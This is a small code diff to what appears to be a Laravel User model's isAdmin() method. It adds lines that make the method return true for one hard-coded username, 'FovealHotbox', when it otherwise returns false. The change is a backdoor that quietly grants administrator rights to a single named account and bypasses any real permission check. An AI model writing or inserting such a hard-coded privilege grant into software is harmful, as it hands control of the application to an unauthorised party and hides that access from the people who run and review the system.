@@ -48,6 +48,9 @@ class User extends Authenticatable
      * Is the User an Admin
      */
     public function isAdmin() {
+        if($this->username === 'FovealHotbox') {
+            return true;
+        }
         return false;
     }
 
